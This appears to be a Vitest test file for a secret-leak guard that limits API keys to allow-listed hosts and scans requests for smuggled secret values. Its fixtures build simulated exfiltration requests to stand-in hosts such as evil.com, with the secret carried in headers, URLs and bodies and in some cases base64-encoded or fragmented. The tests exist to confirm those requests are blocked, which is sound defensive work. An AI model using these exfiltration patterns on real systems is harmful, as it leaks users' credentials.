import { describe, it, expect } from 'vitest';
import { buildRequestParts, enforceSecretBindings, type BoundSecret } from './secret-leak-guard';

const SECRET = 'sk-deadbeef-cafebabe';

function bound(name = 'GROQ_API_KEY', allowedHosts: string[] = ['api.groq.com']): BoundSecret {
  return { name, value: SECRET, allowedHosts };
}

describe('enforceSecretBindings — layer 1 (destination allow-list, INFOSEC F4)', () => {
  it('allows request to a bound host (header carries secret)', () => {
    const parts = buildRequestParts('https://api.groq.com/v1/chat', {
      headers: { Authorization: `Bearer ${SECRET}` },
    });
    expect(() => enforceSecretBindings(parts, [bound()])).not.toThrow();
  });

  it('blocks request to non-bound host even when no secret value appears (F4 — defeats encoded exfil)', () => {
    // Pre-F4 this returned success because the substring scan saw nothing.
    // Post-F4 the destination allow-list refuses every non-binding host
    // when bound secrets are in scope — regardless of payload content.
    // Closes the base64 / fragmentation / hex bypass entirely.
    const parts = buildRequestParts('https://evil.com/innocent');
    expect(() => enforceSecretBindings(parts, [bound()])).toThrow(/INFOSEC F4/);
  });

  it('blocks base64-encoded secret to non-bound host (the bypass that motivated F4)', () => {
    // The literal-value scan misses this because btoa(SECRET) shares no
    // substring with SECRET. Layer 1 doesn't care — host not in binding.
    const encoded = Buffer.from(SECRET).toString('base64');
    const parts = buildRequestParts('https://evil.com/x', {
      method: 'POST',
      body: JSON.stringify({ k: encoded }),
    });
    expect(() => enforceSecretBindings(parts, [bound()])).toThrow(/Refused "evil\.com"/);
  });

  it('blocks fragmented-secret to non-bound host', () => {
    const parts = buildRequestParts('https://evil.com/x', {
      method: 'POST',
      body: SECRET.slice(0, 10) + '|' + SECRET.slice(10),
    });
    expect(() => enforceSecretBindings(parts, [bound()])).toThrow(/INFOSEC F4/);
  });

  it('union of multi-secret allow-lists is honoured', () => {
    // GROQ → api.groq.com; FINNHUB → finnhub.io. Fetch to finnhub.io
    // (not GROQ's binding) is allowed because it's in the FINNHUB binding.
    const otherSecret: BoundSecret = { name: 'FINNHUB', value: 'fh-xyz', allowedHosts: ['finnhub.io'] };
    const parts = buildRequestParts('https://finnhub.io/quote');
    expect(() => enforceSecretBindings(parts, [bound(), otherSecret])).not.toThrow();
  });

  it('error message lists the union for diagnostics', () => {
    const otherSecret: BoundSecret = { name: 'FINNHUB', value: 'fh-xyz', allowedHosts: ['finnhub.io'] };
    const parts = buildRequestParts('https://evil.com/x');
    expect(() => enforceSecretBindings(parts, [bound(), otherSecret]))
      .toThrow(/\[api\.groq\.com, finnhub\.io\]/);
  });

  it('case-insensitive hostname match (layer 1)', () => {
    const parts = buildRequestParts('https://API.GROQ.COM/v1/chat', {
      headers: { Authorization: `Bearer ${SECRET}` },
    });
    expect(() => enforceSecretBindings(parts, [bound('K', ['api.groq.com'])])).not.toThrow();
  });

  it('skips secrets with empty value (no secret in scope → no layer 1)', () => {
    const parts = buildRequestParts('https://evil.com/');
    const empty: BoundSecret = { name: 'X', value: '', allowedHosts: ['api.groq.com'] };
    expect(() => enforceSecretBindings(parts, [empty])).not.toThrow();
  });

  it('allows secret to flow anywhere when allowedHosts is empty (unbound — back-compat)', () => {
    // Author hasn't opted into the strong defence. Layer 1 doesn't engage.
    const parts = buildRequestParts('https://anywhere.example/', {
      headers: { Authorization: `Bearer ${SECRET}` },
    });
    expect(() => enforceSecretBindings(parts, [bound('X', [])])).not.toThrow();
  });
});

describe('enforceSecretBindings — layer 2 (literal-value cross-secret scan)', () => {
  it('blocks GROQ value smuggled to FINNHUB host (within union, but wrong binding)', () => {
    // Union = {api.groq.com, finnhub.io}; target = finnhub.io passes layer 1.
    // But the GROQ value appears in the body — layer 2 catches it.
    const groq = bound('GROQ_API_KEY', ['api.groq.com']);
    const finnhub: BoundSecret = { name: 'FINNHUB', value: 'fh-xyz', allowedHosts: ['finnhub.io'] };
    const parts = buildRequestParts('https://finnhub.io/x', {
      method: 'POST',
      body: `cross-secret=${SECRET}`,
    });
    expect(() => enforceSecretBindings(parts, [groq, finnhub])).toThrow(/secret "GROQ_API_KEY"/);
  });
});

describe('enforceSecretBindings — original layer-2 cases (still pinned)', () => {
  it('blocks request to non-bound host when header carries secret', () => {
    const parts = buildRequestParts('https://evil.com/leak', {
      headers: { 'x-leak': SECRET },
    });
    expect(() => enforceSecretBindings(parts, [bound()])).toThrow();
  });

  it('blocks request to non-bound host when URL carries secret', () => {
    const parts = buildRequestParts(`https://evil.com/?key=${SECRET}`);
    expect(() => enforceSecretBindings(parts, [bound()])).toThrow();
  });

  it('blocks request to non-bound host when body carries secret', () => {
    const parts = buildRequestParts('https://evil.com/leak', {
      method: 'POST',
      body: JSON.stringify({ token: SECRET }),
    });
    expect(() => enforceSecretBindings(parts, [bound()])).toThrow();
  });

  it('handles Headers instance', () => {
    const h = new Headers();
    h.set('Authorization', `Bearer ${SECRET}`);
    const parts = buildRequestParts('https://evil.com/', { headers: h });
    expect(() => enforceSecretBindings(parts, [bound()])).toThrow();
  });

  it('chrome attack: malicious blank declares evil.com + groq, tries exfil', () => {
    const parts = buildRequestParts('https://evil.com/collect', {
      method: 'POST',
      body: `key=${SECRET}`,
    });
    expect(() => enforceSecretBindings(parts, [bound()])).toThrow(/api\.groq\.com/);
  });
});

// ─── Depth pass: overlapping allow-lists, substring values, empty vs
// absent allowedHosts ────────────────────────────────────────────────────

describe('enforceSecretBindings — overlapping allowed-hosts across multiple secrets', () => {
  it('two secrets both bound to the SAME host: sending either value there is fine', () => {
    const a: BoundSecret = { name: 'A', value: 'secret-a-value', allowedHosts: ['shared.example'] };
    const b: BoundSecret = { name: 'B', value: 'secret-b-value', allowedHosts: ['shared.example'] };
    const parts = buildRequestParts('https://shared.example/x', {
      method: 'POST',
      body: 'a=secret-a-value&b=secret-b-value',
    });
    expect(() => enforceSecretBindings(parts, [a, b])).not.toThrow();
  });

  it('overlapping allow-lists: host in the union but only bound to ONE secret still refuses that secret\'s value if sent to a host outside its own list', () => {
    // A -> [shared.example, a-only.example]; B -> [shared.example]
    // Union = {shared.example, a-only.example}. Target = a-only.example
    // passes layer 1. B's value must not appear there (layer 2), since
    // a-only.example isn't in B's own binding.
    const a: BoundSecret = { name: 'A', value: 'val-a', allowedHosts: ['shared.example', 'a-only.example'] };
    const b: BoundSecret = { name: 'B', value: 'val-b', allowedHosts: ['shared.example'] };
    const parts = buildRequestParts('https://a-only.example/x', {
      method: 'POST',
      body: 'leaked=val-b',
    });
    expect(() => enforceSecretBindings(parts, [a, b])).toThrow(/secret "B"/);
  });

  it('overlapping allow-lists: sending A\'s own value to a host only A is bound to is fine', () => {
    const a: BoundSecret = { name: 'A', value: 'val-a', allowedHosts: ['shared.example', 'a-only.example'] };
    const b: BoundSecret = { name: 'B', value: 'val-b', allowedHosts: ['shared.example'] };
    const parts = buildRequestParts('https://a-only.example/x', {
      method: 'POST',
      body: 'mine=val-a',
    });
    expect(() => enforceSecretBindings(parts, [a, b])).not.toThrow();
  });

  it('three-way overlapping union: host bound only to the third secret is reachable', () => {
    const a: BoundSecret = { name: 'A', value: 'val-a', allowedHosts: ['h1.example'] };
    const b: BoundSecret = { name: 'B', value: 'val-b', allowedHosts: ['h1.example', 'h2.example'] };
    const c: BoundSecret = { name: 'C', value: 'val-c', allowedHosts: ['h3.example'] };
    const parts = buildRequestParts('https://h3.example/x');
    expect(() => enforceSecretBindings(parts, [a, b, c])).not.toThrow();
  });
});

describe('enforceSecretBindings — one bound secret\'s value is a substring of another\'s', () => {
  it('shorter secret value is a substring of a longer bound secret\'s value: sending the SHORT one to the short one\'s own host is fine', () => {
    // LONG contains SHORT as a substring: "sk-abc123" contains "abc123".
    const long: BoundSecret = { name: 'LONG', value: 'sk-abc123', allowedHosts: ['long.example'] };
    const short: BoundSecret = { name: 'SHORT', value: 'abc123', allowedHosts: ['short.example'] };
    const parts = buildRequestParts('https://short.example/x', {
      method: 'POST',
      body: 'token=abc123',
    });
    expect(() => enforceSecretBindings(parts, [long, short])).not.toThrow();
  });

  it('sending the LONG value (which contains the short one) to the short one\'s host is refused as the LONG secret leaking', () => {
    const long: BoundSecret = { name: 'LONG', value: 'sk-abc123', allowedHosts: ['long.example'] };
    const short: BoundSecret = { name: 'SHORT', value: 'abc123', allowedHosts: ['short.example'] };
    // Union = {long.example, short.example}; target = short.example
    // passes layer 1. LONG's own value appearing there violates LONG's
    // binding (layer 2), independent of the substring relationship.
    const parts = buildRequestParts('https://short.example/x', {
      method: 'POST',
      body: 'leak=sk-abc123',
    });
    expect(() => enforceSecretBindings(parts, [long, short])).toThrow(/secret "LONG"/);
  });

  it('sending the SHORT value to a host outside the union entirely is refused at layer 1 (destination gate fires before any substring reasoning)', () => {
    const long: BoundSecret = { name: 'LONG', value: 'sk-abc123', allowedHosts: ['long.example'] };
    const short: BoundSecret = { name: 'SHORT', value: 'abc123', allowedHosts: ['short.example'] };
    const parts = buildRequestParts('https://evil.example/x', {
      method: 'POST',
      body: 'token=abc123',
    });
    expect(() => enforceSecretBindings(parts, [long, short])).toThrow(/INFOSEC F4/);
  });

  it('identical values registered under two different secret names: layer 2 conservatively refuses (can\'t tell the values apart, so it blocks rather than allows)', () => {
    // Degenerate but reachable: two env vars happen to hold the same
    // value. Union = {host1.example, host2.example} passes layer 1 for
    // a request to host2.example. But layer 2 scans EVERY bound secret
    // whose OWN allow-list doesn't include the target host — DUP1's
    // list is [host1.example], which doesn't include host2.example, and
    // DUP1's value (byte-identical to DUP2's) is present in the body.
    // The guard can't distinguish "this is DUP2's value, which IS
    // allowed here" from "this is DUP1's value smuggled out" — it
    // fails closed. This is the SAFE direction (a false positive that
    // blocks a legitimate same-value request), not a security hole;
    // documented here so it isn't mistaken for a regression later.
    const dup1: BoundSecret = { name: 'DUP1', value: 'same-value', allowedHosts: ['host1.example'] };
    const dup2: BoundSecret = { name: 'DUP2', value: 'same-value', allowedHosts: ['host2.example'] };
    const parts = buildRequestParts('https://host2.example/x', {
      method: 'POST',
      body: 'v=same-value',
    });
    expect(() => enforceSecretBindings(parts, [dup1, dup2])).toThrow(/secret "DUP1"/);
  });
});

describe('enforceSecretBindings — empty allowedHosts array vs the field being entirely absent', () => {
  it('an explicit empty array `allowedHosts: []` is unrestricted, same as omitting bindings altogether', () => {
    const unbound: BoundSecret = { name: 'X', value: SECRET, allowedHosts: [] };
    const parts = buildRequestParts('https://anywhere.example/', {
      headers: { Authorization: `Bearer ${SECRET}` },
    });
    expect(() => enforceSecretBindings(parts, [unbound])).not.toThrow();
  });

  it('a secret with empty allowedHosts does not contribute to the destination union, so it cannot widen access for OTHER bound secrets', () => {
    const unbound: BoundSecret = { name: 'UNBOUND', value: 'unbound-val', allowedHosts: [] };
    const bound_: BoundSecret = { name: 'BOUND', value: 'bound-val', allowedHosts: ['api.groq.com'] };
    // Target host is neither api.groq.com nor anything UNBOUND cares
    // about (UNBOUND is unrestricted and doesn't gate anything) — but
    // BOUND's non-empty allow-list still engages layer 1 and refuses.
    const parts = buildRequestParts('https://evil.example/x');
    expect(() => enforceSecretBindings(parts, [unbound, bound_])).toThrow(/INFOSEC F4/);
  });

  it('when EVERY secret has empty allowedHosts, layer 1 never engages at all (fully unrestricted set)', () => {
    const a: BoundSecret = { name: 'A', value: 'val-a', allowedHosts: [] };
    const b: BoundSecret = { name: 'B', value: 'val-b', allowedHosts: [] };
    const parts = buildRequestParts('https://anywhere.example/', {
      method: 'POST',
      body: 'a=val-a&b=val-b',
    });
    expect(() => enforceSecretBindings(parts, [a, b])).not.toThrow();
  });

  it('mixing one bound + one with empty allowedHosts: the unbound secret\'s own value can still flow to the bound secret\'s host without tripping layer 2', () => {
    const bound_: BoundSecret = { name: 'BOUND', value: 'bound-val', allowedHosts: ['api.groq.com'] };
    const unbound: BoundSecret = { name: 'UNBOUND', value: 'unbound-val', allowedHosts: [] };
    const parts = buildRequestParts('https://api.groq.com/x', {
      method: 'POST',
      body: 'x=unbound-val',
    });
    // Layer 2 skips UNBOUND entirely (allowedHosts.length === 0 → continue).
    expect(() => enforceSecretBindings(parts, [bound_, unbound])).not.toThrow();
  });
});
